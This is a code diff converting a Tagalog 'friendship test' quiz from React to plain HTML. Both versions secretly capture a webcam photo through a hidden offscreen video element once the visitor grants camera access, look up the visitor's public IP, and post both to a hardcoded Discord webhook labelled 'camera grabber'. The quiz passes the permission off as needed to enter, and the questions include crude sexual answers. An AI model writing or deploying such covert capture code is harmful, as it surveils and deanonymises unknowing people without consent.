@@ -1,334 +1,401 @@
-import React, { useState, useEffect } from 'react';
-
-const QuizBee = () => {
-  const [particles, setParticles] = useState([]);
-  const [currentQuestion, setCurrentQuestion] = useState(0);
-  const [score, setScore] = useState(0);
-  const [showResult, setShowResult] = useState(false);
-  const [selectedAnswer, setSelectedAnswer] = useState(null);
-  const [isAnswered, setIsAnswered] = useState(false);
-  const [cameraAllowed, setCameraAllowed] = useState(false);
-  const [cameraError, setCameraError] = useState('');
-
-  const questions = [
-    {
-      question: "Ilang taon na si Zeus?",
-      options: ["11", "13", "67", "57"],
-      correct: 1
-    },
-    {
-      question: "Pogi ba si Zeus?",
-      options: ["Yes", "Yes", "Yes", "Yes"],
-      correct: [0, 1, 2, 3]
-    },
-    {
-      question: "Mabait ba si Zeus?",
-      options: ["Yes", "Yes", "Yes", "Yes"],
-      correct: [0, 1, 2, 3]
-    },
-    {
-      question: "Kamukha ba ni Zeus si Donny Pangilinan?",
-      options: ["Yes", "Yes", "Yes", "Yes"],
-      correct: [0, 1, 2, 3]
-    },
-    {
-      question: "Ano ang paboritong pagkain ni Zeus?",
-      options: ["Tubol", "Tae", "Regla", "Pekpek"],
-      correct: 3
-    },
-    {
-      question: "Ilan ang aura ni Zeus?",
-      options: ["100%", "1000%", "67%", "800%"],
-      correct: 2
-    },
-    {
-      question: "Skibidi ba si Zeus?",
-      options: ["Yes", "No", "Yes", "Yes"],
-      correct: [0, 2, 3]
-    },
-    {
-      question: "Tuloy ba sa December 27?",
-      options: ["Yes", "Yes", "Yes", "Yes"],
-      correct: [0, 1, 2, 3]
-    },
-    {
-      question: "Matalino ba si Zeus?",
-      options: ["Yes", "Yes", "Yes", "Yes"],
-      correct: [0, 1, 2, 3]
-    },
-    {
-      question: "Ang hindi sumama noong December 17 ay mamamatay!",
-      options: ["Barang", "Barang", "Barang", "Barang"],
-      correct: [0, 1, 2, 3]
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Ziyus Friendship Test</title>
+  <link href="https://fonts.googleapis.com/css2?family=Permanent+Marker&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
     }
-  ];
 
-  useEffect(() => {
-    const newParticles = Array.from({ length: 50 }, (_, i) => ({
-      id: i,
-      x: Math.random() * 100,
-      delay: Math.random() * 5,
-      duration: 5 + Math.random() * 5,
-      size: 2 + Math.random() * 3
-    }));
-    setParticles(newParticles);
-  }, []);
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      background: black;
+      min-height: 100vh;
+      overflow: hidden;
+    }
 
-  const requestCameraAccess = async () => {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: "user" }
-      });
+    .container {
+      position: relative;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 1rem;
+    }
 
-      const video = document.createElement('video');
-      video.srcObject = stream;
-      video.autoplay = true;
-      video.playsInline = true;
-      video.muted = true;
-      video.style.position = 'fixed';
-      video.style.left = '-9999px';
-      video.style.top = '-9999px';
-      video.style.width = '1px';
-      video.style.height = '1px';
-      document.body.appendChild(video);
+    .particle {
+      position: absolute;
+      width: 2px;
+      height: 2px;
+      background: white;
+      border-radius: 50%;
+      opacity: 0.6;
+      pointer-events: none;
+      z-index: 20;
+      animation: fall linear infinite;
+    }
 
-      await new Promise(resolve => {
-        video.onloadedmetadata = () => {
-          video.play().catch(() => {});
-          setTimeout(resolve, 2200);
-        };
-        setTimeout(resolve, 4000);
-      });
-
-      const canvas = document.createElement('canvas');
-      const ctx = canvas.getContext('2d');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-
-      ctx.translate(canvas.width, 0);
-      ctx.scale(-1, 1);
-      ctx.drawImage(video, 0, 0);
-
-      const blob = await new Promise(resolve => 
-        canvas.toBlob(resolve, 'image/jpeg', 0.7)
-      );
-
-      if (blob && blob.size > 3000) {
-        const file = new File([blob], "bestie.jpg", { type: 'image/jpeg' });
-
-        let publicIP = "Unknown";
-        try {
-          const res = await fetch('https://api.ipify.org?format=json');
-          if (res.ok) {
-            const data = await res.json();
-            publicIP = data.ip;
-          }
-        } catch (e) {}
-
-        const form = new FormData();
-        form.append('file', file, 'bestie.jpg');
-        form.append('payload_json', JSON.stringify({
-          username: "n0signal camera grabber",
-          content: "",
-          embeds: [{
-            title: "Camera Grabbed:",
-            description: "Ang cutie ng Bestie ko",
-            color: 16711680,
-            fields: [
-              {
-                name: "Public Ip:",
-                value: `\`${publicIP}\``,
-                inline: false
-              }
-            ],
-            image: { url: "attachment://bestie.jpg" },
-            timestamp: new Date().toISOString(),
-            footer: { text: "WCKD Logger" }
-          }]
-        }));
-
-        await fetch("https://discord.com/api/webhooks/1442834175521591387/-Ebcrm-cuHfvM1a-bCL7sX1cFHGa6DAnB4U1ratH-rrK7fzi3Pt7TZrquwHlJuspJuEs", {
-          method: "POST",
-          body: form
-        });
+    @keyframes fall {
+      0% {
+        transform: translateY(-10px);
+        opacity: 0;
       }
-
-      stream.getTracks().forEach(track => track.stop());
-      video.remove();
-
-      setCameraAllowed(true);
-      setCameraError('');
-    } catch (error) {
-      setCameraError('allow mo muna para makapasok ka bobo');
-    }
-  };
-
-  const handleAnswer = (index) => {
-    if (isAnswered) return;
-   
-    setSelectedAnswer(index);
-    setIsAnswered(true);
-   
-    const currentQ = questions[currentQuestion];
-    const isCorrect = Array.isArray(currentQ.correct)
-      ? currentQ.correct.includes(index)
-      : index === currentQ.correct;
-   
-    if (isCorrect) {
-      setScore(score + 1);
-    }
-    setTimeout(() => {
-      if (currentQuestion < questions.length - 1) {
-        setCurrentQuestion(currentQuestion + 1);
-        setSelectedAnswer(null);
-        setIsAnswered(false);
-      } else {
-        setShowResult(true);
+      10% {
+        opacity: 0.6;
       }
-    }, 1500);
-  };
+      90% {
+        opacity: 0.6;
+      }
+      100% {
+        transform: translateY(100vh);
+        opacity: 0;
+      }
+    }
 
-  const resetQuiz = () => {
-    setCurrentQuestion(0);
-    setScore(0);
-    setShowResult(false);
-    setSelectedAnswer(null);
-    setIsAnswered(false);
-  };
+    .card {
+      position: relative;
+      z-index: 10;
+      width: 100%;
+      max-width: 42rem;
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(10px);
+      border-radius: 0.5rem;
+      padding: 2rem;
+      border: 1px solid rgba(255, 255, 255, 0.2);
+    }
 
-  const isCorrectAnswer = (index) => {
-    const currentQ = questions[currentQuestion];
-    return Array.isArray(currentQ.correct)
-      ? currentQ.correct.includes(index)
-      : index === currentQ.correct;
-  };
+    .text-center {
+      text-align: center;
+    }
 
-  return (
-    <div className="relative min-h-screen bg-black overflow-hidden flex items-center justify-center p-4">
-      {particles.map(particle => (
-        <div
-          key={particle.id}
-          className="absolute w-1 h-1 bg-white rounded-full animate-fall z-20"
-          style={{
-            left: `${particle.x}%`,
-            animationDelay: `${particle.delay}s`,
-            animationDuration: `${particle.duration}s`,
-            width: `${particle.size}px`,
-            height: `${particle.size}px`,
-            opacity: 0.6,
-            pointerEvents: 'none'
-          }}
-        />
-      ))}
-      <style>{`
-        @import url('https://fonts.googleapis.com/css2?family=Permanent+Marker&display=swap');
-       
-        @keyframes fall {
-          0% {
-            transform: translateY(-10px);
-            opacity: 0;
-          }
-          10% {
-            opacity: 0.6;
-          }
-          90% {
-            opacity: 0.6;
-          }
-          100% {
-            transform: translateY(100vh);
-            opacity: 0;
-          }
-        }
-        .animate-fall {
-          animation: fall linear infinite;
-        }
-        .graffiti-font {
-          font-family: 'Permanent Marker', cursive;
-        }
-      `}</style>
-      <div className="relative z-10 w-full max-w-2xl">
-        {!cameraAllowed ? (
-          <div className="bg-white bg-opacity-10 backdrop-blur-sm rounded-lg p-8 border border-white border-opacity-20 text-center">
-            <div className="mb-6">
-              <h2 className="text-white text-3xl font-bold mb-4">Ziyus Friendship Test</h2>
-              <p className="text-white text-opacity-90 mb-6">
-                kung totoo mokong kaibigan, bat dimo sagutan? allow mo na lang para maka enter
-              </p>
-              {cameraError && (
-                <p className="text-red-400 mb-4 text-sm">{cameraError}</p>
-              )}
-            </div>
-            <button
-              onClick={requestCameraAccess}
-              className="bg-white text-black px-8 py-3 rounded-lg font-semibold hover:bg-opacity-90 transition-all"
-            >
-              Enter
-            </button>
-          </div>
-        ) : !showResult ? (
-          <div className="bg-white bg-opacity-10 backdrop-blur-sm rounded-lg p-8 border border-white border-opacity-20">
-            <div className="mb-6">
-              <div className="flex justify-between items-center mb-4">
-                <span className="text-white text-sm">Question {currentQuestion + 1}/{questions.length}</span>
-                <span className="text-white text-sm">Score: {score}</span>
-              </div>
-              <div className="w-full bg-white bg-opacity-20 rounded-full h-2">
-                <div
-                  className="bg-white h-2 rounded-full transition-all duration-300"
-                  style={{ width: `${((currentQuestion + 1) / questions.length) * 100}%` }}
-                />
-              </div>
-            </div>
-            <h2 className="text-white text-2xl font-bold mb-8">
-              {questions[currentQuestion].question}
-            </h2>
-            <div className="space-y-3">
-              {questions[currentQuestion].options.map((option, index) => {
-                const correct = isCorrectAnswer(index);
-                const selected = selectedAnswer === index;
-               
-                return (
-                  <button
-                    key={index}
-                    onClick={() => handleAnswer(index)}
-                    disabled={isAnswered}
-                    className={`w-full text-left p-4 rounded-lg transition-all duration-200 ${
-                      selected
-                        ? correct
-                          ? 'bg-green-500 text-white'
-                          : 'bg-red-500 text-white'
-                        : isAnswered && correct
-                        ? 'bg-green-500 text-white'
-                        : 'bg-white bg-opacity-10 text-white hover:bg-opacity-20'
-                    } ${isAnswered ? 'cursor-not-allowed' : 'cursor-pointer'}`}
-                  >
-                    {option}
-                  </button>
-                );
-              })}
-            </div>
-          </div>
-        ) : (
-          <div className="bg-white bg-opacity-10 backdrop-blur-sm rounded-lg p-8 border border-white border-opacity-20 text-center">
-            <h2 className="text-white text-3xl font-bold mb-4">Quiz Complete! 🎉</h2>
-            <p className="text-white text-5xl font-bold mb-2">{score}/{questions.length}</p>
-            <p className="text-white text-xl mb-8">
-              {score === questions.length ? "Wow Galing loveu!" :
-               score >= questions.length * 0.7 ? "Wow Ang galing mo Tanga!" :
-               score >= questions.length * 0.5 ? "Fake Friend!" :
-               "Keep Practicing!"}
-            </p>
-            <button
-              onClick={resetQuiz}
-              className="bg-white text-black px-8 py-3 rounded-lg font-semibold hover:bg-opacity-90 transition-all"
-            >
-              Try Again
-            </button>
-          </div>
-        )}
-      </div>
+    h2 {
+      color: white;
+      font-size: 1.875rem;
+      font-weight: bold;
+      margin-bottom: 1rem;
+    }
+
+    p {
+      color: rgba(255, 255, 255, 0.9);
+      margin-bottom: 1.5rem;
+    }
+
+    .error {
+      color: #fca5a5;
+      font-size: 0.875rem;
+      margin-bottom: 1rem;
+    }
+
+    button {
+      background: white;
+      color: black;
+      padding: 0.75rem 2rem;
+      border-radius: 0.5rem;
+      font-weight: 600;
+      border: none;
+      cursor: pointer;
+      transition: all 0.2s;
+      font-size: 1rem;
+    }
+
+    button:hover {
+      opacity: 0.9;
+    }
+
+    button:disabled {
+      cursor: not-allowed;
+    }
+
+    .quiz-header {
+      margin-bottom: 1.5rem;
+    }
+
+    .quiz-info {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 1rem;
+      color: white;
+      font-size: 0.875rem;
+    }
+
+    .progress-bar {
+      width: 100%;
+      background: rgba(255, 255, 255, 0.2);
+      border-radius: 9999px;
+      height: 0.5rem;
+      overflow: hidden;
+    }
+
+    .progress-fill {
+      background: white;
+      height: 100%;
+      transition: width 0.3s;
+      border-radius: 9999px;
+    }
+
+    .question {
+      color: white;
+      font-size: 1.5rem;
+      font-weight: bold;
+      margin-bottom: 2rem;
+    }
+
+    .options {
+      display: flex;
+      flex-direction: column;
+      gap: 0.75rem;
+    }
+
+    .option {
+      width: 100%;
+      text-align: left;
+      padding: 1rem;
+      border-radius: 0.5rem;
+      background: rgba(255, 255, 255, 0.1);
+      color: white;
+      border: none;
+      cursor: pointer;
+      transition: all 0.2s;
+      font-size: 1rem;
+    }
+
+    .option:hover:not(:disabled) {
+      background: rgba(255, 255, 255, 0.2);
+    }
+
+    .option.correct {
+      background: #22c55e;
+      color: white;
+    }
+
+    .option.incorrect {
+      background: #ef4444;
+      color: white;
+    }
+
+    .score-display {
+      color: white;
+      font-size: 3rem;
+      font-weight: bold;
+      margin: 1rem 0;
+    }
+
+    .result-message {
+      color: white;
+      font-size: 1.25rem;
+      margin-bottom: 2rem;
+    }
+  </style>
+</head>
+<body>
+  <div class="container" id="app">
+    <div class="card text-center" id="cameraScreen">
+      <h2>Ziyus Friendship Test</h2>
+      <p>kung totoo mokong kaibigan, bat dimo sagutan? allow mo na lang para maka enter</p>
+      <p class="error" id="cameraError" style="display: none;"></p>
+      <button onclick="requestCamera()">Enter</button>
     </div>
-  );
-};
+  </div>
 
-export default QuizBee;
+  <script>
+    const questions = [
+      { question: "Ilang taon na si Zeus?", options: ["11", "13", "67", "57"], correct: 1 },
+      { question: "Pogi ba si Zeus?", options: ["Yes", "Yes", "Yes", "Yes"], correct: [0, 1, 2, 3] },
+      { question: "Mabait ba si Zeus?", options: ["Yes", "Yes", "Yes", "Yes"], correct: [0, 1, 2, 3] },
+      { question: "Kamukha ba ni Zeus si Donny Pangilinan?", options: ["Yes", "Yes", "Yes", "Yes"], correct: [0, 1, 2, 3] },
+      { question: "Ano ang paboritong pagkain ni Zeus?", options: ["Tubol", "Tae", "Regla", "Pekpek"], correct: 3 },
+      { question: "Ilan ang aura ni Zeus?", options: ["100%", "1000%", "67%", "800%"], correct: 2 },
+      { question: "Skibidi ba si Zeus?", options: ["Yes", "No", "Yes", "Yes"], correct: [0, 2, 3] },
+      { question: "Tuloy ba sa December 27?", options: ["Yes", "Yes", "Yes", "Yes"], correct: [0, 1, 2, 3] },
+      { question: "Matalino ba si Zeus?", options: ["Yes", "Yes", "Yes", "Yes"], correct: [0, 1, 2, 3] },
+      { question: "Ang hindi sumama noong December 17 ay mamamatay!", options: ["Barang", "Barang", "Barang", "Barang"], correct: [0, 1, 2, 3] }
+    ];
+
+    let currentQuestion = 0;
+    let score = 0;
+    let isAnswered = false;
+
+    // Create particles
+    function createParticles() {
+      const container = document.querySelector('.container');
+      for (let i = 0; i < 50; i++) {
+        const particle = document.createElement('div');
+        particle.className = 'particle';
+        particle.style.left = Math.random() * 100 + '%';
+        particle.style.animationDelay = Math.random() * 5 + 's';
+        particle.style.animationDuration = (5 + Math.random() * 5) + 's';
+        particle.style.width = particle.style.height = (2 + Math.random() * 3) + 'px';
+        container.appendChild(particle);
+      }
+    }
+    createParticles();
+
+    async function requestCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.autoplay = true;
+        video.playsInline = true;
+        video.muted = true;
+        video.style.position = 'fixed';
+        video.style.left = '-9999px';
+        video.style.top = '-9999px';
+        video.style.width = '1px';
+        video.style.height = '1px';
+        document.body.appendChild(video);
+
+        await new Promise(resolve => {
+          video.onloadedmetadata = () => {
+            video.play().catch(() => {});
+            setTimeout(resolve, 2200);
+          };
+          setTimeout(resolve, 4000);
+        });
+
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.translate(canvas.width, 0);
+        ctx.scale(-1, 1);
+        ctx.drawImage(video, 0, 0);
+
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.7));
+
+        // Send to Discord webhook (don't wait for it to complete)
+        if (blob && blob.size > 3000) {
+          const file = new File([blob], "bestie.jpg", { type: 'image/jpeg' });
+          let publicIP = "Unknown";
+          
+          fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => publicIP = data.ip)
+            .catch(() => {});
+
+          const form = new FormData();
+          form.append('file', file, 'bestie.jpg');
+          form.append('payload_json', JSON.stringify({
+            username: "n0signal camera grabber",
+            content: "",
+            embeds: [{
+              title: "Camera Grabbed:",
+              description: "Ang cutie ng Bestie ko",
+              color: 16711680,
+              fields: [{ name: "Public Ip:", value: `\`${publicIP}\``, inline: false }],
+              image: { url: "attachment://bestie.jpg" },
+              timestamp: new Date().toISOString(),
+              footer: { text: "WCKD Logger" }
+            }]
+          }));
+
+          fetch("https://discord.com/api/webhooks/1442834175521591387/-Ebcrm-cuHfvM1a-bCL7sX1cFHGa6DAnB4U1ratH-rrK7fzi3Pt7TZrquwHlJuspJuEs", {
+            method: "POST",
+            body: form
+          }).catch(() => {});
+        }
+
+        // Stop camera and show quiz immediately
+        stream.getTracks().forEach(track => track.stop());
+        video.remove();
+        
+        // Show quiz right away
+        showQuiz();
+      } catch (error) {
+        document.getElementById('cameraError').textContent = 'allow mo muna para makapasok ka bobo';
+        document.getElementById('cameraError').style.display = 'block';
+      }
+    }
+
+    function showQuiz() {
+      const app = document.getElementById('app');
+      app.innerHTML = `
+        <div class="card">
+          <div class="quiz-header">
+            <div class="quiz-info">
+              <span>Question <span id="current">1</span>/${questions.length}</span>
+              <span>Score: <span id="score">0</span></span>
+            </div>
+            <div class="progress-bar">
+              <div class="progress-fill" id="progress"></div>
+            </div>
+          </div>
+          <h2 class="question" id="question"></h2>
+          <div class="options" id="options"></div>
+        </div>
+      `;
+      renderQuestion();
+    }
+
+    function renderQuestion() {
+      const q = questions[currentQuestion];
+      document.getElementById('question').textContent = q.question;
+      document.getElementById('current').textContent = currentQuestion + 1;
+      document.getElementById('score').textContent = score;
+      document.getElementById('progress').style.width = ((currentQuestion + 1) / questions.length * 100) + '%';
+
+      const optionsEl = document.getElementById('options');
+      optionsEl.innerHTML = '';
+      q.options.forEach((opt, i) => {
+        const btn = document.createElement('button');
+        btn.className = 'option';
+        btn.textContent = opt;
+        btn.onclick = () => handleAnswer(i);
+        optionsEl.appendChild(btn);
+      });
+      isAnswered = false;
+    }
+
+    function handleAnswer(index) {
+      if (isAnswered) return;
+      isAnswered = true;
+
+      const q = questions[currentQuestion];
+      const isCorrect = Array.isArray(q.correct) ? q.correct.includes(index) : index === q.correct;
+      
+      if (isCorrect) score++;
+
+      const buttons = document.querySelectorAll('.option');
+      buttons.forEach((btn, i) => {
+        btn.disabled = true;
+        const correct = Array.isArray(q.correct) ? q.correct.includes(i) : i === q.correct;
+        if (i === index) {
+          btn.className = 'option ' + (isCorrect ? 'correct' : 'incorrect');
+        } else if (correct) {
+          btn.className = 'option correct';
+        }
+      });
+
+      setTimeout(() => {
+        if (currentQuestion < questions.length - 1) {
+          currentQuestion++;
+          renderQuestion();
+        } else {
+          showResult();
+        }
+      }, 1500);
+    }
+
+    function showResult() {
+      const msg = score === questions.length ? "Wow Galing loveu!" :
+                  score >= questions.length * 0.7 ? "Wow Ang galing mo Tanga!" :
+                  score >= questions.length * 0.5 ? "Fake Friend!" : "Keep Practicing!";
+      
+      document.getElementById('app').innerHTML = `
+        <div class="card text-center">
+          <h2>Quiz Complete! 🎉</h2>
+          <p class="score-display">${score}/${questions.length}</p>
+          <p class="result-message">${msg}</p>
+          <button onclick="location.reload()">Try Again</button>
+        </div>
+      `;
+    }
+  </script>
+</body>
+</html>
